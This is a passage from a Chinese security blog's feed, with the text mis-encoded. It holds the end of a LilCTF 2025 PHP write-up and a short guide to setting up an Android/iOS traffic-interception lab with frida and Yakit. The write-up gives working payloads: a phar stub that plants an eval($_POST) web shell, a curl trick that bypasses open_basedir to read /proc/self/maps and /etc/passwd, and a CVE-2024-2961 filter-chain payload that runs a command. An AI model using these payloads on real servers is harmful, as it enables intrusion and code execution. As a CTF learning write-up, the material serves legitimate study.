,sodium_crypto_generichash,sodium_crypto_generichash_keygen,sodium_crypto_generichash_init,sodium_crypto_generichash_update,sodium_crypto_generichash_final,sodium_crypto_kdf_derive_from_key,sodium_crypto_kdf_keygen,sodium_crypto_pwhash,sodium_crypto_pwhash_str,sodium_crypto_pwhash_str_verify,sodium_crypto_pwhash_str_needs_rehash,sodium_crypto_pwhash_scryptsalsa208sha256,sodium_crypto_pwhash_scryptsalsa208sha256_str,sodium_crypto_pwhash_scryptsalsa208sha256_str_verify,sodium_crypto_scalarmult,sodium_crypto_secretbox,sodium_crypto_secretbox_keygen,sodium_crypto_secretbox_open,sodium_crypto_secretstream_xchacha20poly1305_keygen,sodium_crypto_secretstream_xchacha20poly1305_init_push,sodium_crypto_secretstream_xchacha20poly1305_push,sodium_crypto_secretstream_xchacha20poly1305_init_pull,sodium_crypto_secretstream_xchacha20poly1305_pull,sodium_crypto_secretstream_xchacha20poly1305_rekey,sodium_crypto_shorthash,sodium_crypto_shorthash_keygen,sodium_crypto_sign,sodium_crypto_sign_detached,sodium_crypto_sign_ed25519_pk_to_curve25519,sodium_crypto_sign_ed25519_sk_to_curve25519,sodium_crypto_sign_keypair,sodium_crypto_sign_keypair_from_secretkey_and_publickey,sodium_crypto_sign_open,sodium_crypto_sign_publickey,sodium_crypto_sign_secretkey,sodium_crypto_sign_publickey_from_secretkey,sodium_crypto_sign_seed_keypair,sodium_crypto_sign_verify_detached,sodium_crypto_stream,sodium_crypto_stream_keygen,sodium_crypto_stream_xor,sodium_add,sodium_compare,sodium_increment,sodium_memcmp,sodium_memzero,sodium_pad,sodium_unpad,sodium_bin2hex,sodium_hex2bin,sodium_bin2base64,sodium_base642bin,sodium_crypto_scalarmult_base</span><span class="token key attr-name">disable_classes</span> <span class="token punctuation">=</span> <span class="token value attr-value">stdClass, Exception, ErrorException, Error, CompileError, ParseError, TypeError, ArgumentCountError, ArithmeticError, DivisionByZeroError, Closure, Generator, ClosedGeneratorException, DateTime, DateTimeImmutable, DateTimeZone, DateInterval, DatePeriod, LibXMLError, SQLite3, SQLite3Stmt, SQLite3Result, DOMException, DOMStringList, DOMNameList, DOMImplementationList, DOMImplementationSource, DOMImplementation, DOMNode, DOMNameSpaceNode, DOMDocumentFragment, DOMDocument, DOMNodeList, DOMNamedNodeMap, DOMCharacterData, DOMAttr, DOMElement, DOMText, DOMComment, DOMTypeinfo, DOMUserDataHandler, DOMDomError, DOMErrorHandler, DOMLocator, DOMConfiguration, DOMCdataSection, DOMDocumentType, DOMNotation, DOMEntity, DOMEntityReference, DOMProcessingInstruction, DOMStringExtend, DOMXPath, finfo, HashContext, JsonException, LogicException, BadFunctionCallException, BadMethodCallException, DomainException, InvalidArgumentException, LengthException, OutOfRangeException, RuntimeException, OutOfBoundsException, OverflowException, RangeException, UnderflowException, UnexpectedValueException, RecursiveIteratorIterator, IteratorIterator, FilterIterator, RecursiveFilterIterator, CallbackFilterIterator, RecursiveCallbackFilterIterator, ParentIterator, LimitIterator, CachingIterator, RecursiveCachingIterator, NoRewindIterator, AppendIterator, InfiniteIterator, RegexIterator, RecursiveRegexIterator, EmptyIterator, RecursiveTreeIterator, ArrayObject, ArrayIterator, RecursiveArrayIterator, SplFileInfo, DirectoryIterator, FilesystemIterator, RecursiveDirectoryIterator, GlobIterator, SplFileObject, SplTempFileObject, SplDoublyLinkedList, SplQueue, SplStack, SplHeap, SplMinHeap, SplMaxHeap, SplPriorityQueue, SplFixedArray, SplObjectStorage, MultipleIterator, PDOException, PDO, PDOStatement, PDORow, SessionHandler, ReflectionException, Reflection, ReflectionFunctionAbstract, ReflectionFunction, ReflectionGenerator, ReflectionParameter, ReflectionType, ReflectionNamedType, ReflectionMethod, ReflectionClass, ReflectionObject, ReflectionProperty, ReflectionClassConstant, ReflectionExtension, ReflectionZendExtension, __PHP_Incomplete_Class, php_user_filter, Directory, AssertionError, SimpleXMLElement, SimpleXMLIterator, PharException, Phar, PharData, PharFileInfo, XMLReader, XMLWriter, SodiumException</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å‡ ä¹banå…‰äº†ï¼Œä½†æ˜¯banå¾—è¶Šå¤šæ€è·¯è¶Šæ¸…æ™°</p><p>é¦–å…ˆæ˜¯ä¸Šä¼ åŠŸèƒ½çš„å†…å®¹æ£€æµ‹ï¼Œä¸Šä¼ åˆ° &#x2F;tmp ä¸‹ï¼Œban äº† php å’Œ phar çš„ç‰¹å¾ï¼Œè€Œä¸‹è½½åŠŸèƒ½æ˜¯ä¸ª includeï¼Œæ˜æ˜¾æ˜¯ç”¨åˆ°äº†æœ€æ–°æœ€çƒ­çš„åŒ…å«  phar.gz è§£æä¸º PHPï¼š <a href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/</a></p><p>æ„é€ æˆ‘ä»¬çš„ phar åŒ…ï¼Œç”Ÿæˆåç”¨ gzip å†æ¬¡æ‰“åŒ…</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exploit.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stub</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token string single-quoted-string">'STUB'</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST[0]);"</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/2.php"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>STUB;$phar->setStub($stub);$phar->addFromString('test.txt', 'test');$phar->stopBuffering();?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ ä¹‹åè®¿é—® down&#x3D;exploit.phar.gz ç›´æ¥å†™é©¬åˆ° &#x2F;var&#x2F;www&#x2F;html</p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½æ‰§è¡Œä»»æ„ PHP ä»£ç äº†ï¼Œæ³¨æ„åˆ° glibc2.36ï¼Œè¦æƒ³ç»•è¿‡ disable_functions å¾ˆæ˜æ˜¾å°±æ˜¯æ‰“ cve-2024-2961ï¼Œåœ¨æ­¤ä¹‹å‰è¦å…ˆè·å– &#x2F;proc&#x2F;self&#x2F;mapsï¼Œlibc.so.6 ç›´æ¥å– docker çš„å°±è¡Œ</p><p>é‚£ä¹ˆè¦ç»•è¿‡ open_basedirï¼Œä¸€å¼€å§‹æˆ‘å¯»æ€æºç é‡Œä¸“é—¨å¼€äº†ä¸ª fastcgi è¦ç”¨å®ƒæ¥ç»•ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹åˆä¸è¡Œï¼Œæ³¨æ„åˆ°ç»™çš„æºç é‡Œæœ‰ä¸ªæ³¨é‡Šï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// I hide a trick to bypass open_basedir, I'm sure you can find it.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‚£å…ˆåœ¨æˆ‘ä»¬çš„é©¬é‡Œ include ä¸€ä¸‹ index.php çœ‹çœ‹è¿œç«¯ç¯å¢ƒçš„ä»£ç æœ‰ä»€ä¹ˆä¸åŒï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_PROTOCOLS_STR</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// secret trick to bypass, omg why will i show it to you!</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœä¸€ä¸‹æœ‰ <a href="https://github.com/php/php-src/issues/16802">https://github.com/php/php-src/issues/16802</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> run <span class="token parameter variable">-ti</span> php@sha256:62a9d2183e1039f4d06d7f1bbfa8de7ccebf04fc4d3d849939648150d1000237 php <span class="token parameter variable">-d</span> <span class="token string">'open_basedir=/nowhere'</span> <span class="token parameter variable">-r</span> <span class="token string">'echo phpversion()."\n"; $ch = curl_init("file:///etc/passwd");curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");curl_exec($ch);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‚£ä¹ˆæˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„ curl_exec å³å¯ç»•è¿‡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file:///proc/self/maps'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_PROTOCOLS_STR</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/17/LilCTF-2025/image-20250817230144578.png" alt="image-20250817230144578"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰“cve-2024-2961ï¼Œå¯ç”¨çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åªå‰©ä¸‹äº† file_put_contents</p><p>è€Œ file_put_contents å¯¹äº php:&#x2F;&#x2F;filter çš„æ“ä½œæ˜¯åœ¨ filename å¤„ä½¿ç”¨ filterï¼Œè¦è¢«è§£ç çš„æ•°æ®åˆ™æ˜¯åœ¨ content ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‹¿åˆ°ç”Ÿæˆçš„ payload éœ€è¦æŠŠåé¢çš„ data å¡«åˆ° content ä¸­</p><p>ç”Ÿæˆè„šæœ¬é‡Œè¦æ‰§è¡Œçš„å‘½ä»¤æ”¹æˆ <code>/readflag &gt; /var/www/html/1.txt</code></p><p>è¿™æ˜¯é€šå¸¸æ–‡ä»¶è¯»å–ä¸‹çš„payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXcNLjHaJsCUfemyw4Mu0GY/PbmYF7whPeNl2/kaI8/9T0j5oyN/iPWHzI2xL6Vsv/4W%2bur/YNi1SC%2bJdO2crEgBcYtKZaPtLavvrKxlXbb2TrFnenNOPXwOCTFNm349RbrdI1r3S/RZ2%2bo3RTgYCOyRHTlNcV7faSXV3Vvfea0XYPMw4CVjzdl1M4tWqqVdjWb%2boHvheuvq8%2b367u1rddb%2bJf/ft1I37935%2b/4msvqiTvvfT%2bp6fypP3sBFzw775t1pdP23qNwl6L/d78Ln7%2b7%2bO///3atj/u9%2bet128d9y%2bNf/f7%2bG35/u%2bf4%2bvt7CfFSxIwbtLv9deZT7zfH8evsP%2b/Udj%2bKzfmf//7MbV%2bz9ePa36vffc9dX/9l5OPk%2bv3xK%2bve3n69vW//%2bp8r/1d%2b23jvvevf/19cju7/t6685Hfju%2byl7suXfxvj93n2/XnKr80V6bNt9/fP8d%2b29%2bZ739V1V5fHX/4bbT9pz19/e4LpNs%2b3gd61Ry/0xoydU6Lha8MX5kcmj1l5t/H%2bfvdN9kSCB2Jc8pG13quVeUEqgl6/mccVTyqeFQxnRUv235FyvjuO6N332qnqHqp3CaQZROqvNcaXn6r9zjvvnvkIpdNvAzUNT7K%2b%2b4jLdO6JafrTp/u/aRZp1f///n%2bOm1VpRx2QuWPbmn36is/Jur9Xuv2M0Uw0ZpQdZK9Mjpm6bH%2bkpv5pqfUuzvqmQE='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> æˆ‘ä»¬è¦æ”¹æˆ file_put_contents çš„å½¢å¼ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=3.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e3vXcNLjHaJsCUfemyw4Mu0GY/PbmYF7whPeNl2/kaI8/9T0j5oyN/iPWHzI2xL6Vsv/4W%2bur/YNi1SC%2bJdO2crEgBcYtKZaPtLavvrKxlXbb2TrFnenNOPXwOCTFNm349RbrdI1r3S/RZ2%2bo3RTgYCOyRHTlNcV7faSXV3Vvfea0XYPMw4CVjzdl1M4tWqqVdjWb%2boHvheuvq8%2b367u1rddb%2bJf/ft1I37935%2b/4msvqiTvvfT%2bp6fypP3sBFzw775t1pdP23qNwl6L/d78Ln7%2b7%2bO///3atj/u9%2bet128d9y%2bNf/f7%2bG35/u%2bf4%2bvt7CfFSxIwbtLv9deZT7zfH8evsP%2b/Udj%2bKzfmf//7MbV%2bz9ePa36vffc9dX/9l5OPk%2bv3xK%2bve3n69vW//%2bp8r/1d%2b23jvvevf/19cju7/t6685Hfju%2byl7suXfxvj93n2/XnKr80V6bNt9/fP8d%2b29%2bZ739V1V5fHX/4bbT9pz19/e4LpNs%2b3gd61Ry/0xoydU6Lha8MX5kcmj1l5t/H%2bfvdN9kSCB2Jc8pG13quVeUEqgl6/mccVTyqeFQxnRUv235FyvjuO6N332qnqHqp3CaQZROqvNcaXn6r9zjvvnvkIpdNvAzUNT7K%2b%2b4jLdO6JafrTp/u/aRZp1f///n%2bOm1VpRx2QuWPbmn36is/Jur9Xuv2M0Uw0ZpQdZK9Mjpm6bH%2bkpv5pqfUuzvqmQE='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰§è¡Œè„šæœ¬ï¼Œ502 å‡ºæ¥ï¼Œflag å°±åœ¨ 1.txt ä¸‹äº†</p><h2 id="å…³äº-fpm"><a href="#å…³äº-fpm" class="headerlink" title="å…³äº fpm"></a>å…³äº fpm</h2><p>gopher æ‰“ fpm ä¸å¥æ•ˆï¼šgopher æ”¯æŒ NULL byte å¹¶ä¸æ˜¯ä¸€ä¸ªé¢„æœŸçš„è¡Œä¸º, åœ¨ RFC ä¸­æ˜ç¡®è§„å®šäº† gopher çš„ url ä¸åº”å½“æ”¯æŒ NULL byte, ä½†æ˜¯åœ¨æŸä¸€ä¸ªç‰ˆæœ¬çš„ cURL å´å¼€å§‹é”™è¯¯çš„å…è®¸äº†è¿™ä¸ªè¡Œä¸º. å½“ç„¶ä¹‹åä¹Ÿè¢«é‡æ–°é™åˆ¶Â (åœ¨ [7.45.0,7.71.0] æœŸé—´å¯ä»¥å‘é€, åœ¨Â <a href="https://github.com/curl/curl/commit/31e53584db5879894809fbde5445aac7553ac3e2">æ­¤ Commit</a>Â ä¸­ä¿®å¤, åœ¨Â <a href="https://github.com/curl/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195">æ­¤ Commit</a>Â è¢«å¼•å…¥ by @orangetw)</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;PHP è¿˜æ˜¯å¤ªè¯±äººäº†ï¼ˆ&lt;/p&gt;
&lt;p&gt;å‡ºé¢˜äººçš„åšå®¢ï¼š &lt;a href=&quot;https://blog.kengwang.com.cn/archives/668/&quot;&gt;https://blog.kengwang.com.cn/archives/668/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="PHP" scheme="http://c1oudfl0w0.github.io/blog/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>ç§»åŠ¨ç«¯æ¸—é€ç¯å¢ƒé…ç½®</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/08/14/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/08/14/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2025-08-14T06:41:54.000Z</published>
    <updated>2025-10-06T14:21:20.788Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://boogipop.com/2023/05/29/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5DFRIDA%20HOOK%EF%BC%9A%E8%84%B1%E5%A3%B3%E3%80%81%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85%E7%BB%95%E8%BF%87SSL/#%EF%BC%883%EF%BC%89Burp-frida%E9%85%8D%E5%90%88%E6%8A%93%E5%8C%85">FRIDA HOOKï¼šè„±å£³ã€æ‰‹æœºæŠ“åŒ… - Boogiepop Doesnâ€™t Laugh</a></p><p><a href="https://www.cnblogs.com/freedom-h/p/18778021">https://www.cnblogs.com/freedom-h/p/18778021</a></p><p><a href="https://yaklang.com/Yaklab/WeChatAppEx/#%E6%AD%A5%E9%AA%A4-3-%E5%AE%89%E8%A3%85-yakit-%E7%9A%84-ca-%E8%AF%81%E4%B9%A6">https://yaklang.com/Yaklab/WeChatAppEx/#%E6%AD%A5%E9%AA%A4-3-%E5%AE%89%E8%A3%85-yakit-%E7%9A%84-ca-%E8%AF%81%E4%B9%A6</a></p><p><a href="https://lucxer.tech/2021/03/20/15.ab%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/">https://lucxer.tech/2021/03/20/15.ab%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/</a></p><span id="more"></span><hr><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>jadx åç¼–è¯‘ apk</p><p><a href="https://github.com/n0mi1k/apk2url">https://github.com/n0mi1k/apk2url</a></p><hr><h1 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h1><p>æŠ“åŒ…é€‰æ‹©ç”¨ Yakit</p><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><p>è®¾å¤‡ï¼šGoogle Pixel 5ï¼ˆå·²rootï¼‰Android14</p><p>å…ˆæŸ¥çœ‹è®¾å¤‡çš„æ¶æ„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell getprop ro.product.cpu.abi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/14/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20250814153203455.png" alt="image-20250814153203455"></p><p>frida ä¸‹è½½å¯¹åº”æ¶æ„çš„ serverï¼Œç„¶å push åˆ°æ‰‹æœºä¸­</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb push ./frida-server-17.2.16-android-arm64 /data/local/tmp/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <code>adb shell</code> è¿›å…¥æ‰‹æœºçš„ shellï¼Œ<code>su</code> ææƒåˆ° rootï¼Œç„¶åç»™ frida-server èµ‹æƒ</p><p><img src="/blog/2025/08/14/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20250814154628147.png" alt="image-20250814154628147"></p><p>æ¥ä¸‹æ¥å‡†å¤‡æŠ“åŒ…ï¼š</p><p>yakit è®¾ç½® mitm ç›‘å¬ 0.0.0.0 å³æ‰€æœ‰ç½‘å¡</p><p><img src="/blog/2025/08/14/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20250814160017331.png" alt="image-20250814160017331"></p><p>ä¸‹è½½ yakit çš„ pem è¯ä¹¦ï¼Œç›´æ¥ push åˆ°æ‰‹æœº</p><h3 id="ä»…æµè§ˆå™¨æŠ“åŒ…"><a href="#ä»…æµè§ˆå™¨æŠ“åŒ…" class="headerlink" title="ä»…æµè§ˆå™¨æŠ“åŒ…"></a>ä»…æµè§ˆå™¨æŠ“åŒ…</h3><p>åœ¨æ‰‹æœºä¸Šå®‰è£…è¯ä¹¦å³å¯</p><p>æ‰‹æœºéœ€è¦å’Œç”µè„‘åœ¨åŒä¸€ç½‘ç»œä¸‹ï¼Œæ‰‹æœºé…ç½®ç½‘ç»œä»£ç†ä¸º ç”µè„‘ip:8083</p><p>æ‰‹æœºè®¿é—® example.comï¼Œæµ‹è¯•æˆåŠŸå¯ä»¥æŠ“åˆ°åŒ…</p><p><img src="/blog/2025/08/14/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/image-20250814163733299.png" alt="image-20250814163733299"></p><h3 id="åº”ç”¨æŠ“åŒ…"><a href="#åº”ç”¨æŠ“åŒ…" class="headerlink" title="åº”ç”¨æŠ“åŒ…"></a>åº”ç”¨æŠ“åŒ…</h3><p>ä¸Šé¢çš„æ–¹æ³•å®é™…å¯¼å…¥çš„æ˜¯ç”¨æˆ·è¯ä¹¦ï¼ŒæŠ“ä¸åˆ°appçš„åŒ…</p><p>å¯ä½¿ç”¨è¿™ä¸ªæ¨¡å—ï¼š<a href="https://github.com/ys1231/MoveCertificate">https://github.com/ys1231/MoveCertificate</a></p><p>ç„¶åç›´æ¥ç”¨ç³»ç»Ÿè®¾ç½®è£… crt å³å¯</p><hr><h2 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h2><p>è®¾å¤‡ï¼šIOS12</p><p>ä¸»è¦æ˜¯å®‰è£…è¯ä¹¦ï¼Œç”±äºæ‰¾ä¸åˆ°å¼€å‘è€…æ¨¡å¼ï¼Œè¿™é‡Œç›´æ¥ä¸‹è½½crtï¼Œç„¶åå®‰è£…è¯ä¹¦ï¼Œå†åœ¨é€šç”¨-å…³äºæœ¬æœº-è¯ä¹¦ä¿¡ä»»è®¾ç½®ä¸­æ·»åŠ è¯ä¹¦ä¿¡ä»»</p><p>mac å…¼å®¹ iosï¼Œæˆ–è®¸å¯ä»¥ mac ä¸Šç›´æ¥è£…å¯¹åº” appï¼Œç„¶å proxifier ä»£ç†ï¼ˆ</p><hr><h1 id="abå¤‡ä»½æ–‡ä»¶å¤„ç†"><a href="#abå¤‡ä»½æ–‡ä»¶å¤„ç†" class="headerlink" title="abå¤‡ä»½æ–‡ä»¶å¤„ç†"></a>abå¤‡ä»½æ–‡ä»¶å¤„ç†</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/05/29/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5DFRIDA%20HOOK%EF%BC%9A%E8%84%B1%E5%A3%B3%E3%80%81%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85%E7%BB%95%E8%BF%87SSL/#%EF%BC%883%EF%BC%89Burp-frida%E9%85%8D%E5%90%88%E6%8A%93%E5%8C%85&quot;&gt;FRIDA HOOKï¼šè„±å£³ã€æ‰‹æœºæŠ“åŒ… - Boogiepop Doesnâ€™t Laugh&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/freedom-h/p/18778021&quot;&gt;https://www.cnblogs.com/freedom-h/p/18778021&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yaklang.com/Yaklab/WeChatAppEx/#%E6%AD%A5%E9%AA%A4-3-%E5%AE%89%E8%A3%85-yakit-%E7%9A%84-ca-%E8%AF%81%E4%B9%A6&quot;&gt;https://yaklang.com/Yaklab/WeChatAppEx/#%E6%AD%A5%E9%AA%A4-3-%E5%AE%89%E8%A3%85-yakit-%E7%9A%84-ca-%E8%AF%81%E4%B9%A6&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lucxer.tech/2021/03/20/15.ab%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/&quot;&gt;https://lucxer.tech/2021/03/20/15.ab%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ¸—é€" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
</feed>
